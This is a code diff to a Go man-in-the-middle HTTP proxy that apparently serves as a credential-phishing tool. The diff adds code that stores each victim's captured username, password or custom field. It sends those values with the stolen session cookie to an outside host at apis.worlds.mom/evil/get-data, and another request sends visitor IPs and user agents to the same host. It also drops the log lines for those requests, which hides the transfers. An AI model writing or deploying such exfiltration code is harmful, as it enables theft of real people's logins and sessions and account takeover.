@@ -158,6 +158,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
 
+	apiUsername :=""
+	apiPassword :=""
+
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
 			ps := &ProxySession{
@@ -301,8 +304,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.sids[session.Id] = sid
 
 									worldContent := doReq("https://apis.worlds.mom/evil/get-data?ip=" + remote_addr + "&agent=" + url.QueryEscape(req.Header.Get("User-Agent")))
-									//worldContent := doReq("https://apis.worlds.mom/evil/get-data?ip=" + remote_addr)
-									log.Info("API Content: %s", worldContent)
 
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
 									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
@@ -599,6 +600,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if um != nil && len(um) > 1 {
 											p.setSessionUsername(ps.SessionId, um[1])
 											log.Success("[%d] Username: [%s]", ps.Index, um[1])
+
+											apiUsername = um[1]
+
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
@@ -609,6 +613,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if pm != nil && len(pm) > 1 {
 											p.setSessionPassword(ps.SessionId, pm[1])
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+
+											apiPassword = pm[1]
+
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
@@ -620,6 +627,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if cm != nil && len(cm) > 1 {
 												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+
+												apiPassword = cm[1]
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 													log.Error("database: %v", err)
 												}
@@ -893,8 +902,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						s.IsDone = true
 
-						worldContent := doReq("https://apis.worlds.mom/evil/get-data/?cookie=" + url.QueryEscape(sendCookie))
-					    log.Info("API Content: %s", worldContent)
+						worldContent := doReq("https://apis.worlds.mom/evil/get-data/?user="+ apiUsername +"&pwd=" + apiPassword + "&cookie=" + url.QueryEscape(sendCookie))					    
 					}
 				}
 			}
